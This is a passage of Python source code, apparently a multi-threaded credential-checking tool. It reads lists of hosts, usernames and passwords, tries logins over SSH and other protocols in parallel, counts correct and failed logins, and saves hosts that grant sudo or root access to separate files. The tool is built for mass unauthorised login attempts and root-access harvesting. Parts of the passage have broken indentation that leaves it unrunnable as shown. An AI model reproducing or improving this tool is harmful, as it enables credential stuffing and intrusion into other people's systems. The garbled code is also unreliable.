            # Handle SSH-specific root access files
            if protocol == "SSH" and (sudo_available or su_root_available):
                root_access_entry = output_line

                with FILE_LOCKS["root_access.txt"]:
                    with open("root_access.txt", "a", encoding="utf-8") as root_file:
                        root_file.write(root_access_entry)

                if sudo_available:
                    with FILE_LOCKS["root_sudo.txt"]:
                        with open("root_sudo.txt", "a", encoding="utf-8") as sudo_output_file:
                            sudo_output_file.write(root_access_entry)


        def remove_checked_hosts_by_counter(sourcefile, batch_size=300):
            """Removes the first batch_size hosts from the sourcefile."""
            try:
                if not os.path.exists(sourcefile):
                    script_logger.error(f"Source file {sourcefile} does not exist")
                    return

                with open(sourcefile, "r", encoding="utf-8", errors="ignore") as src_file:
                    lines = src_file.readlines()

                if not lines:
                    script_logger.warning(f"Source file {sourcefile} is empty")
                    return

                lines_to_remove_count = 0
                hosts_removed_count = 0
        current_line_idx = 0

        while current_line_idx < len(lines) and hosts_removed_count < batch_size:
            line = lines[current_line_idx].strip()

            if line.startswith("SSH://"):
                lines_to_remove_count += 1
                hosts_removed_count += 1
                current_line_idx += 1
            elif line.startswith("Host:"):
                if (
                        current_line_idx + 2 < len(lines)
                        and lines[current_line_idx + 1].strip().startswith("Username:")
                        and lines[current_line_idx + 2].strip().startswith("Password:")
                ):
                    lines_to_remove_count += 3
                    hosts_removed_count += 1
                    current_line_idx += 3
                else:
                    script_logger.warning(
                        f"Incomplete host entry at line {current_line_idx}. Expected Username: and Password: on the following lines. Skipping this entry."
                    )
                    current_line_idx += 1
            else:
                current_line_idx += 1

        if lines_to_remove_count > 0:
            remaining_lines = lines[lines_to_remove_count:]
            with FILE_LOCKS["sourcefile"]:
                with open(sourcefile, "w", encoding="utf-8") as src_file:
                    src_file.writelines(remaining_lines)
            script_logger.debug(
                f"Removed {hosts_removed_count} hosts ({lines_to_remove_count} lines) from {sourcefile}"
            )

    except Exception as e:
    script_logger.error(
        f"Error removing checked hosts from {sourcefile}: {e}", exc_info=True
    )


def print_login_attempts(total_lines, start_time_main):
    """Prints a summary of login attempts to the console using rich."""
    active_threads = count_active_threads()
    with CURRENT_HOST_LOCK:
        current_host = CURRENT_HOST
    with CURRENT_LINE_LOCK:
        current_line = CURRENT_LINE

    elapsed_time = time.time() - start_time_main

    console = Console()
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Statistic", justify="left")
    table.add_column("Value", justify="right")

    table.add_row("🕒 Runtime", f"{elapsed_time:.2f}s")
    table.add_row("📋 Total Lines", str(total_lines))

    # *** FIXED: Prevent ZeroDivisionError ***
    progress_percent_str = (
        f"({(current_line / total_lines) * 100:.1f}%)" if total_lines > 0 else "(N/A)"
    )
    table.add_row(
        "📌 Current Line",
        f"{current_line} {progress_percent_str}",
    )
    table.add_row("🚀 Active Threads", str(active_threads))
    table.add_row(
        "✅ Correct Logins", str(sum(login_attempts["correct_logins"].values()))
    )
    table.add_row(
        "❌ Failed Logins",
        str(sum(login_attempts["incorrect_logins"].values())),
    )

    console.print("\n")
    console.print(
        Panel.fit(
            table,
            title="[bold]Progress Overview[/bold]",
            border_style="bright_blue",
            padding=(1, 4),
        )
    )
    console.print("\n")

if __name__ == "__main__":
    hosts_checked_since_last_removal = 0
    start_time_main = time.time()
    all_tasks = []

    try:
        with open(args.file, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line.startswith("SSH://") or line.startswith("Host:"):
                    TOTAL_LINES += 1
    except FileNotFoundError:
        script_logger.critical(f"Input file not found: {args.file}")
        sys.exit(1)
    except Exception as e:
        script_logger.critical(f"Error reading input file {args.file}: {e}")
        sys.exit(1)

    if TOTAL_LINES == 0:
        script_logger.critical(
            f"No valid host entries found in '{args.file}'. Exiting."
        )
        sys.exit(0)

    # Initialize stats after you have TOTAL_LINES
    stats = MultiProtocolFancyStats(
        total_hosts=TOTAL_LINES,
        filename=args.file,
        protocols=protocols,
        threads=args.threads,
    )

    # Start stats display
    stats.start()
    time.sleep(1)  # Give display time to start

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            # Set active threads for stats
            if stats:
                stats.set_active_threads(args.threads)
                stats.add_output(f"🚀 Starting scan with {args.threads} threads")

            try:
                with open(args.file, "r", encoding="utf-8", errors="ignore") as f:
                    lines_buffer = []
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue

                        if line.startswith("SSH://"):
                            host_info = parse_ssh_url(line)
                            if host_info:
                                host, port, username, password = host_info
                                if "SSH" in protocols:
                                    all_tasks.append(
                                        executor.submit(
                                            check_login_thread,
                                            host,
                                            port,
                                            username,
                                            password,
                                            timeout,
                                            "SSH",
                                            args.file,
                                            start_time_main,
                                        )
                                    )
                        elif line.startswith("Host:"):
                            if lines_buffer:
                                lines_buffer = []
                            lines_buffer.append(line)
                        elif line.startswith("Username:") and len(lines_buffer) == 1:
                            lines_buffer.append(line)
                        elif line.startswith("Password:") and len(lines_buffer) == 2:
                            lines_buffer.append(line)

                            # Parse the host/username/password block
                            host_part = lines_buffer[0].split(":", 1)[1].strip()
                            username = lines_buffer[1].split(":", 1)[1].strip()
                            password = lines_buffer[2].split(":", 1)[1].strip()

                            # FIXED: ALWAYS use the port specified in the source file
                            # Handle host:port format - NO DEFAULT PORT FALLBACK
                            if ":" in host_part:
                                host, port_str = host_part.rsplit(":", 1)
                                try:
                                    port = int(port_str)
                                except ValueError:
                                    script_logger.error(f"Invalid port format in: {host_part}")
                                    lines_buffer = []
                                    continue
                            else:
                                script_logger.error(f"No port specified in host entry: {host_part}")
                                lines_buffer = []
                                continue

                            # Submit tasks for all enabled protocols using the EXACT port from file
                            for proto in protocols:
                                all_tasks.append(
                                    executor.submit(
                                        check_login_thread,
                                        host,
                                        port,  # ALWAYS use the port from the source file
                                        username,
                                        password,
                                        timeout,
                                        proto,
                                        args.file,
                                        start_time_main,
                                    )
                                )
                            lines_buffer = []
                        else:
                            lines_buffer = []

            except Exception as e:
                script_logger.error(f"Error processing input file: {e}", exc_info=True)
                if stats:
                    stats.add_output(f"❌ Error processing file: {str(e)[:50]}")

            # Wait for all tasks to complete
            if stats:
                stats.add_output(f"⏳ Waiting for {len(all_tasks)} tasks to complete...")

            completed_tasks = 0
            for future in concurrent.futures.as_completed(all_tasks):
                try:
                    result = future.result()
                    completed_tasks += 1

                    # Update active threads count
                    remaining_tasks = len(all_tasks) - completed_tasks
                    active_threads = min(args.threads, remaining_tasks)
                    if stats:
                        stats.set_active_threads(active_threads)

                except Exception as exc:
                    script_logger.error(f'Task generated an exception: {exc}', exc_info=True)
                    if stats:
                        stats.add_output(f"❌ Task error: {str(exc)[:50]}")

    except KeyboardInterrupt:
        script_logger.info("Scan interrupted by user")
        if stats:
            stats.add_output("🛑 Scan interrupted by user")
    except Exception as e:
        script_logger.error(f"Unexpected error in main execution: {e}", exc_info=True)
        if stats:
            stats.add_output(f"❌ Unexpected error: {str(e)[:50]}")
    finally:
        # Final stats update
        if stats:
            stats.set_active_threads(0)
            stats.add_output("🎉 Scan completed!")
            time.sleep(3)  # Show final results
            stats.stop()

    # Print final summary
    print_login_attempts(TOTAL_LINES, start_time_main)
    console.print("\n[bold cyan]Scanning complete![/bold cyan]\n")

